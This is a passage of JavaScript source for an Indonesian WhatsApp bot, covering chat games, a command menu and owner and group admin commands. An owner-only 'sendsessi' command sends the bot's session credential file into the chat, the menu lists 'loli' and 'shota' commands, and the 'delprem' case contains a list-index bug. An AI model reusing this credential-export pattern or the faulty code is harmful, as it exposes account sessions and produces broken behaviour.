await Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${setting.botName} bot`, m)
delete tebakgambar[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 adduangUser(sender, http, uang)
await Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${setting.botName} bot`, m)
delete tebakkata[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 adduangUser(sender, http, uang)
await Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${setting.botName} bot`, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   adduangUser(sender, http, uang)
await Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${setting.botName} bot`, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 adduangUser(sender, http, uang)
await Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${setting.botName} bot`, m)
delete tebaklirik[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
  adduangUser(sender, http, uang)
await Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${setting.botName} bot`, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await Cepti.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Cepti.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP creator Cepti
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
Cepti.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
Cepti.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) Cepti.sendText(roof.p, `Silahkan pilih \n\nBatu🪨\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) Cepti.sendText(roof.p2, `Silahkan pilih \n\nBatu🪨\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) Cepti.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
Cepti.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) Cepti.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) Cepti.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
Cepti.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
	menulist = `Hallo ${pushname} ${ucapanWaktu}
╔━═━⊱ *「 BOT INFO 」*
┃ダNomor : ${sender.split('@')[0]}*
┃ダUser : ${isPremium ? 'Premium' : 'Free'}*
┃ダAdmin : ${isAdmins ? 'Ya' : 'No'}*
┃ダRole: ${role}*
┃ダUang : ${checkuangUser(sender)}*
┃ダLimit : ${isPremium ? 'UNLIMITED' : `${checklimitUser(sender)}`}*
┗━━━━━━━━━━━━━━⬣
╔━═━⊱ *「 BOT INFO」* ━═━⬣
┃冬 My Love: Riska><♡
┃冬 Lib : Baileys Multi Device
┃冬 Prefix : Multi Prefix
┃冬 Baterai : 100% ga dicas
┃冬 Platfrom : Win32
┃冬 Language : Javascript
┗━━━━━━━━━━━━━━⬣
Tanggal: ${hariini}`
	listmn = `
_*MAIN COMMAND*_
│⫹⫺  ${prefix}limit
│⫹⫺  ${prefix}atm
│⫹⫺  ${prefix}buylimit

_*ANONYMOUS MAIN*_
│⫹⫺  ${prefix}start
│⫹⫺  ${prefix}next
│⫹⫺  ${prefix}stop

_*GROUP MENU*_
│⫹⫺  ${prefix}getpp [tag]
│⫹⫺  ${prefix}afk [Alasan]
│⫹⫺  ${prefix}linkgroup
│⫹⫺  ${prefix}ephemeral [option]
│⫹⫺  ${prefix}setppgc [image]
│⫹⫺  ${prefix}setname [text]
│⫹⫺  ${prefix}setdesc [text]
│⫹⫺  ${prefix}group [option]
│⫹⫺  ${prefix}editinfo [option]
│⫹⫺  ${prefix}add @user
│⫹⫺  ${prefix}kick @user
│⫹⫺  ${prefix}hidetag [text]
│⫹⫺  ${prefix}tagall [text]
│⫹⫺  ${prefix}promote @user
│⫹⫺  ${prefix}demote @user
│⫹⫺  ${prefix}vote [text]
│⫹⫺  ${prefix}devote
│⫹⫺  ${prefix}upvote
│⫹⫺  ${prefix}cekvote
│⫹⫺  ${prefix}hapusvote
│⫹⫺  ${prefix}antilink
│⫹⫺  ${prefix}welcome
│⫹⫺  ${prefix}listonline

_*DOWNLOADER MENU*_
│⫹⫺  ${prefix}ytmp3 [url]
│⫹⫺  ${prefix}ytmp4 [url]
│⫹⫺  ${prefix}umma [url]
│⫹⫺  ${prefix}twitter [url]
│⫹⫺  ${prefix}mediafire [url]
│⫹⫺  ${prefix}zippyshare [url]
│⫹⫺  ${prefix}gitclone [url]
│⫹⫺  ${prefix}facebook [url]
│⫹⫺  ${prefix}tiktok [url]

_*SEARCH MENU*_
│⫹⫺  ${prefix}searchgc [query]
│⫹⫺  ${prefix}play [query]
│⫹⫺  ${prefix}yts [query]
│⫹⫺  ${prefix}google [query]
│⫹⫺  ${prefix}gimage [query]
│⫹⫺  ${prefix}pinterest [query]
│⫹⫺  ${prefix}wallpaper [query]
│⫹⫺  ${prefix}wikimedia [query]
│⫹⫺  ${prefix}ytsearch [query]
│⫹⫺  ${prefix}ringtone [query]
│⫹⫺  ${prefix}pinterest2 [query]
│⫹⫺  ${prefix}mcpedl [query]
│⫹⫺  ${prefix}happymod [query]

_*FUN MENU*_
│⫹⫺  ${prefix}fakemore
│⫹⫺  ${prefix}quotes
│⫹⫺  ${prefix}halah
│⫹⫺  ${prefix}hilih
│⫹⫺  ${prefix}huluh
│⫹⫺  ${prefix}heleh
│⫹⫺  ${prefix}holoh
│⫹⫺  ${prefix}jadian
│⫹⫺  ${prefix}jodohku
│⫹⫺  ${prefix}delttt
│⫹⫺  ${prefix}tictactoe
│⫹⫺  ${prefix}family100
│⫹⫺  ${prefix}tebak [option]
│⫹⫺  ${prefix}math [mode]
│⫹⫺  ${prefix}suitpvp [@tag]
│⫹⫺  ${prefix}react [Emoji]

_*PRIMBON MENU*_
│⫹⫺  ${prefix}nomorhoki
│⫹⫺  ${prefix}artimimpi
│⫹⫺  ${prefix}artinama
│⫹⫺  ${prefix}ramaljodoh
│⫹⫺  ${prefix}ramaljodohbali
│⫹⫺  ${prefix}suamiistri
│⫹⫺  ${prefix}ramalcinta
│⫹⫺  ${prefix}cocoknama
│⫹⫺  ${prefix}pasangan
│⫹⫺  ${prefix}jadiannikah
│⫹⫺  ${prefix}sifatusaha
│⫹⫺  ${prefix}rezeki
│⫹⫺  ${prefix}pekerjaan
│⫹⫺  ${prefix}nasib
│⫹⫺  ${prefix}penyakit
│⫹⫺  ${prefix}tarot
│⫹⫺  ${prefix}fengshui
│⫹⫺  ${prefix}haribaik
│⫹⫺  ${prefix}harisangar
│⫹⫺  ${prefix}harisial
│⫹⫺  ${prefix}nagahari
│⫹⫺  ${prefix}arahrezeki
│⫹⫺  ${prefix}peruntungan
│⫹⫺  ${prefix}weton
│⫹⫺  ${prefix}karakter
│⫹⫺  ${prefix}keberuntungan
│⫹⫺  ${prefix}memancing
│⫹⫺  ${prefix}masasubur
│⫹⫺  ${prefix}zodiak
│⫹⫺  ${prefix}shio

_*CONVERTER MENU*_
│⫹⫺  ${prefix}toimage
│⫹⫺  ${prefix}removebg
│⫹⫺  ${prefix}sticker
│⫹⫺  ${prefix}emojimix
│⫹⫺  ${prefix}tovideo
│⫹⫺  ${prefix}togif
│⫹⫺  ${prefix}tourl
│⫹⫺  ${prefix}tovn
│⫹⫺  ${prefix}tomp3
│⫹⫺  ${prefix}toaudio
│⫹⫺  ${prefix}ebinary
│⫹⫺  ${prefix}dbinary

_*OTHER MENU*_
│⫹⫺  ${prefix}chord
│⫹⫺  ${prefix}fliptext
│⫹⫺  ${prefix}toletter
│⫹⫺  ${prefix}del
│⫹⫺  ${prefix}image
│⫹⫺  ${prefix}kalkulator
│⫹⫺  ${prefix}ping
│⫹⫺  ${prefix}owner
│⫹⫺  ${prefix}delete
│⫹⫺  ${prefix}infochat
│⫹⫺  ${prefix}quoted
│⫹⫺  ${prefix}setcmd
│⫹⫺  ${prefix}listcmd
│⫹⫺  ${prefix}delcmd
│⫹⫺  ${prefix}lockcmd
│⫹⫺  ${prefix}addmsg
│⫹⫺  ${prefix}listmsg
│⫹⫺  ${prefix}getmsg
│⫹⫺  ${prefix}delmsg
│⫹⫺  ${prefix}servermc

_*ISLAM MENU*_
│⫹⫺  ${prefix}iqra
│⫹⫺  ${prefix}hadist
│⫹⫺  ${prefix}alquran
│⫹⫺  ${prefix}juzamma

_*VOICE CHANGER MENU*_
│⫹⫺  ${prefix}bass
│⫹⫺  ${prefix}blown
│⫹⫺  ${prefix}deep
│⫹⫺  ${prefix}earrape
│⫹⫺  ${prefix}fast
│⫹⫺  ${prefix}fat
│⫹⫺  ${prefix}nightcore
│⫹⫺  ${prefix}reverse
│⫹⫺  ${prefix}robot
│⫹⫺  ${prefix}slow
│⫹⫺  ${prefix}tupai

_*OWNER MENU*_
│⫹⫺  ${prefix}sendsessi
│⫹⫺  ${prefix}chat [option]
│⫹⫺  ${prefix}join [link]
│⫹⫺  ${prefix}leave
│⫹⫺  ${prefix}block @user
│⫹⫺  ${prefix}unblock @user
│⫹⫺  ${prefix}bcgroup [text]
│⫹⫺  ${prefix}bcall [text]
│⫹⫺  ${prefix}setppbot [image]
│⫹⫺  ${prefix}setbio [text]
│⫹⫺  ${prefix}listpc
│⫹⫺  ${prefix}listgc
│⫹⫺  ${prefix}addprem
│⫹⫺  ${prefix}dellprem
│⫹⫺  ${prefix}ban
│⫹⫺  ${prefix}unban

_*STIKER MENU*_
│⫹⫺  ${prefix}stickerwm [Teks1|Teks2]
│⫹⫺  ${prefix}sticker
│⫹⫺  ${prefix}gura
│⫹⫺  ${prefix}patrik
│⫹⫺  ${prefix}stikeranime
│⫹⫺  ${prefix}doge
│⫹⫺  ${prefix}bucinstick
│⫹⫺  ${prefix}semoji
│⫹⫺  ${prefix}emojimix
│⫹⫺  ${prefix}smeme

_*NEWS MENU*_
│⫹⫺  ${prefix}jalantikus-meme
│⫹⫺  ${prefix}merdeka-news
│⫹⫺  ${prefix}kontan-news
│⫹⫺  ${prefix}cnbc-news
│⫹⫺  ${prefix}tribun-news
│⫹⫺  ${prefix}indozone-news
│⫹⫺  ${prefix}kompas-news
│⫹⫺  ${prefix}detik-news
│⫹⫺  ${prefix}daily-news
│⫹⫺  ${prefix}inews-news
│⫹⫺  ${prefix}okezone-news
│⫹⫺  ${prefix}sindo-news
│⫹⫺  ${prefix}tempo-news
│⫹⫺  ${prefix}antara-news
│⫹⫺  ${prefix}cnn-news
│⫹⫺  ${prefix}fajar-news

_*MAKER MENU*_
│⫹⫺  ${prefix}nulis
│⫹⫺  ${prefix}3dbox
│⫹⫺  ${prefix}drapwater
│⫹⫺  ${prefix}lion2
│⫹⫺  ${prefix}papercut
│⫹⫺  ${prefix}transformer
│⫹⫺  ${prefix}herryp
│⫹⫺  ${prefix}neondevil
│⫹⫺  ${prefix}3dstone
│⫹⫺  ${prefix}3davengers
│⫹⫺  ${prefix}thunder
│⫹⫺  ${prefix}window
│⫹⫺  ${prefix}graffiti
│⫹⫺  ${prefix}pornhub
│⫹⫺  ${prefix}blackping
│⫹⫺  ${prefix}glitch
│⫹⫺  ${prefix}glitch2
│⫹⫺  ${prefix}glitch3
│⫹⫺  ${prefix}3dspace
│⫹⫺  ${prefix}lion
│⫹⫺  ${prefix}3dneon
│⫹⫺  ${prefix}neon
│⫹⫺  ${prefix}greenneon
│⫹⫺  ${prefix}bokeh
│⫹⫺  ${prefix}hollographic
│⫹⫺  ${prefix}bear
│⫹⫺  ${prefix}wolf
│⫹⫺  ${prefix}joker
│⫹⫺  ${prefix}dropwater
│⫹⫺  ${prefix}neonlight
│⫹⫺  ${prefix}natural
│⫹⫺  ${prefix}carbon
│⫹⫺  ${prefix}pencil
│⫹⫺  ${prefix}candy
│⫹⫺  ${prefix}christmas
│⫹⫺  ${prefix}3dchristmas
│⫹⫺  ${prefix}sparklechristmas
│⫹⫺  ${prefix}deepsea
│⫹⫺  ${prefix}scifi
│⫹⫺  ${prefix}rainbow
│⫹⫺  ${prefix}waterpipe
│⫹⫺  ${prefix}spooky
│⫹⫺  ${prefix}circuit
│⫹⫺  ${prefix}discovery
│⫹⫺  ${prefix}metalic
│⫹⫺  ${prefix}fiction
│⫹⫺  ${prefix}demon
│⫹⫺  ${prefix}berry
│⫹⫺  ${prefix}thunder
│⫹⫺  ${prefix}magma
│⫹⫺  ${prefix}3dstone
│⫹⫺  ${prefix}neonlight
│⫹⫺  ${prefix}glitch
│⫹⫺  ${prefix}harrypotter
│⫹⫺  ${prefix}brokenglass
│⫹⫺  ${prefix}papercut
│⫹⫺  ${prefix}watercolor
│⫹⫺  ${prefix}multicolor
│⫹⫺  ${prefix}neondevil
│⫹⫺  ${prefix}underwater
│⫹⫺  ${prefix}graffitibike
│⫹⫺  ${prefix}snow
│⫹⫺  ${prefix}cloud
│⫹⫺  ${prefix}honey
│⫹⫺  ${prefix}ice
│⫹⫺  ${prefix}fruitjuice
│⫹⫺  ${prefix}biscuit
│⫹⫺  ${prefix}wood
│⫹⫺  ${prefix}chocolate
│⫹⫺  ${prefix}strawberry
│⫹⫺  ${prefix}matrix
│⫹⫺  ${prefix}blood
│⫹⫺  ${prefix}toxic
│⫹⫺  ${prefix}lava
│⫹⫺  ${prefix}rock
│⫹⫺  ${prefix}bloodglas
│⫹⫺  ${prefix}hallowen
│⫹⫺  ${prefix}darkgold
│⫹⫺  ${prefix}wicker
│⫹⫺  ${prefix}firework
│⫹⫺  ${prefix}skeleton
│⫹⫺  ${prefix}blackpink
│⫹⫺  ${prefix}sand
│⫹⫺  ${prefix}glue
│⫹⫺  ${prefix}1917
│⫹⫺  ${prefix}leaves

_*ANIME MENU*_
│⫹⫺  ${prefix}manga
│⫹⫺  ${prefix}quotesanime
│⫹⫺  ${prefix}wallnime
│⫹⫺  ${prefix}waifu
│⫹⫺  ${prefix}husbu
│⫹⫺  ${prefix}loli
│⫹⫺  ${prefix}shota
`
//document randomizer
function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)
/////TEKS BUTTON
const koinPerlimit = 100
const yaya = koinPerlimit * args[0]
const beli1 = (`*⟪ PEMBAYARAN BERHASIL ⟫*\n\n➸ pengirim : ${setting.botName}\n➸ penerima : ${pushname}\n➸ nominal pembelian : ${q} \n➸ harga limit : ${koinPerlimit}/limit\n➸ sisa uang : ${checkuangUser(sender)}\n\nproses berhasil dengan SN\n${createSerial(15)}`)
const beli2 = `© ${setting.botName}`
const beli3 = [
{buttonId: `${prefix}limit`, buttonText: {displayText: 'CEK LIMIT'}, type: 1}
]
const prem1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\nFitur Ini Khusus Member Premium Silahkan Buy Premium Untuk Menggunakan Fitur Ini `
const prem2 = `Klik tombol di bawah ini untuk membeli premium \n © ${setting.botName} bot`
const prem3 = [{buttonId: `${prefix}beli`,buttonText: {displayText: `BELI PREMIUM`,},type: 1,},]
const daftar1 = `Hai kak ${pushname} ${ucapanWaktu} \n\nSebelum Menggunakan ${setting.botName} Daftar Terlebih Dahulu Ya `
const daftar2 = `Klik tombol di bawah \nJika tidak ada tombol ketik ${prefix}daftar\n*© ${setting.botName} bot*`
const daftar3 = [{buttonId: `${prefix}daftar`,buttonText: {displayText: `❮ ᴠᴇʀɪғʏ ❯`,},type: 1,},]

blomdaftar = `${ucapanWaktu} @${sender.split("@")[0]} Kamu belum terdaftar di database cek private message mu untuk mendaftar`
limitabis = `*[LIMIT KAMU HABIS]*\nBeli limit di ${prefix}buylimit atau beli premium untuk mendapatkan unlimited limit`
switch(command) {
  ////GRUB
case 'sendsessi':
if (!isOwner) return reply(mess.owner)
Cepti.sendMessage(from, { document: fs.readFileSync(`./${setting.sessionName}.json`), mimetype: 'jpg/application', fileName: `${setting.sessionName}.json`}, { quoted: m })
break
  case 'beli':
  reply('coming soon...')
  break
case 'ban':
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Masukan Nomornya contoh: \n${prefix}${command} 62858****`)
if(isNaN(q)) return await reply('harus berupa nomor')
  if (q.includes(`+`)) return reply('Tidak menggunakan + langsung nomor 6285****')
prmin = args.join(" ")
banned.push(`${prmin}@s.whatsapp.net`)
fs.writeFileSync('./database/user/banned.json', JSON.stringify(banned))
reply(`*Nomor wa.me/${prmin} telah dibanned !*`)
break
case 'unban':
  if (!isOwner) return reply(mess.owner)
  if (!q) return reply(`Masukan Nomornya contoh: \n${prefix}${command} 628586826398`)
  if(isNaN(q)) return await reply('harus berupa nomor')
  if (q.includes(`+`)) return reply('Tidak menggunakan + langsung nomor 6285****')
prmin = `${q}@s.whatsapp.net`
anul = banned.indexOf(prmin)
banned.splice(anul, 1)
fs.writeFileSync('./database/user/banned.json', JSON.stringify(banned))
reply(`*Nomor wa.me/${prmin} telah di unban !*`)
  break
  case 'addprem':
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Masukan Nomornya contoh: \n${prefix}${command} 628586826398`)
if(isNaN(q)) return await reply('harus berupa nomor')
  if (q.includes(`+`)) return reply('Tidak menggunakan + langsung nomor 6285****')
prmi = args.join(" ")
premium.push(`${prmi}@s.whatsapp.net`)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(premium))
reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${prmi}`)
break
case 'delprem':
 case 'dellprem':
  if (!isOwner) return reply(mess.owner)
  if (!q) return reply(`Masukan Nomornya contoh: \n${prefix}${command} 628586826398`)
  if(isNaN(q)) return await reply('harus berupa nomor')
  if (q.includes(`+`)) return reply('Tidak menggunakan + langsung nomor 6285****')
  prmin = `${q}@s.whatsapp.net`
anul = banned.indexOf(prmin)
premium.splice(anul, 1)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(premium))
reply(mess.success)
  break
  case 'welcome':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)

    if (isBan) return reply(mess.banned)
  if (args[0] === 'enable'){
   if (isWelkom) return reply(`*Udah nyala!*`)
welkom.push(from)
fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
reply('*「WELCOME DI AKTIFKAN」*')
	} else if (args[0] === 'disable') {
	  if (!isWelkom) return reply(`*Belum Nyala!*`)
   anu = welkom.indexOf(from)
   welkom.splice(anu, 1)
fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
reply('*「WELCOME DI NONAKTIFKAN」*')
	} else {
const buttonstod = [{buttonId: `${prefix}welcome enable`, buttonText: {displayText: 'ON'}, type: 1},{buttonId: `${prefix}welcome disable`, buttonText: {displayText: 'OF'}, type: 1}]
const patri = {
text: `Silahkan pilih salah satu di bawah`,
footer: `© ${setting.botName} bot`,
buttons: buttonstod,
headerType: 1
}
Cepti.sendMessage(from, patri, {quoted:ftex})
}
  break
  case 'antilink': 
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins && !isOwner) return reply(mess.admin)

    if (isBan) return reply(mess.banned)
  if (args[0] === 'enable'){
   if (isAntilink) return reply(`*Udah nyala!*`)
antilink.push(from)
fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
reply('*「ANTILINK DI AKTIFKAN」*\n\nYang Mengenai Link Group Bakal Ke Kick!')
	} else if (args[0] === 'disable') { if (!isAntilink) return reply(`*Belum nyala!*`)
   anu = antilink.indexOf(from)
   antilink.splice(anu, 1)
fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
reply('*「ANTILINK DI NONAKTIFKAN」*')
	} else {
const buttonstod = [{buttonId: `${prefix}antilink enable`, buttonText: {displayText: 'ON'}, type: 1},{buttonId: `${prefix}antilink disable`, buttonText: {displayText: 'OF'}, type: 1}]
const patri = {
text: `Silahkan pilih salah satu di bawah`,
footer: `© ${setting.botName} bot`,
buttons: buttonstod,
headerType: 1
}
Cepti.sendMessage(from, patri, {quoted:ftex})
}
  break
  case 'sabar':
reply(`يَا أَيُّهَا الَّذِينَ آمَنُوا اصْبِرُوا وَصَابِرُوا وَرَ
ابِطُوا وَاتَّقُوا اللَّهَ لَعَلَّكُمْ تُفْلِحُونَ

Wahai orang-orang yang beriman! Bersabarlah kamu dan kuatkanlah kesabaranmu dan tetaplah bersiap siaga (di perbatasan negerimu) dan bertakwalah kepada Allah agar kamu beruntung. (Ali Imran ayat 200) `)
break
case 'react':{
  
    if (isBan) return reply(mess.banned)
  Cepti.sendMessage(from, reactionMessage)
}
break
case 'film':
  
if (isBan) return reply(mess.banned)
if (!q) return reply(`Apa yg mau kamu cari?\nExample: ${prefix}film Spiderman`)
if ( checklimitUser(sender) <= 0) return reply(limitabis) 
x.Film(q)
    .then(data => {console.log(data)
    let krl = `*❒「  Film ${q} 」*\n*🌿 Author* : ${data[0].author}\n\n`
	for (let i of data) {
krl += (`\n────────────────────\n\n *•Title :* ${i.judul}\n *• Quality :* ${i.quality}\n *• Type : ${i.type}*\n *• Uploaded :* ${i.upload}\n *• Source :* ${i.link}`)
}
   Cepti.sendMessage(from, { image: { url: data[0].thumb}, caption: krl }, { quoted: ftex })
});
confirmlimit(sender, 1)
break
  case 'quotes' :

    if (isBan) return reply(mess.banned)
  if ( checklimitUser(sender) <= 0) return reply(limitabis) 
    var res = await Quotes()
    const buttons = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: 'NEXT'}, type: 1}
]
const pa = {
text: `
Quotes:\n${res.quotes}\n
Author: ${res.author}`,
footer: `© ${setting.botName} bot`,
buttons: buttons,
headerType: 1
}
Cepti.sendMessage(from, pa, {quoted:ftex})
confirmlimit(sender, 1)
break
  case 'afk': {
if (!m.isGroup) return reply('Cuma bisa di grub bro')

    if (isBan) return reply(mess.banned)
let user = global.db.users[m.sender]
const reason = q ? q : 'Nothing'
user.afkTime = + new Date
user.afkReason = reason
reply(`*@${sender.split("@")[0]}* sedang afk *${reason}*`)
}
break
case 'ttc': case 'ttt': case 'tictactoe': {
  
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return reply( 'Kamu masih didalam game')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
reply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

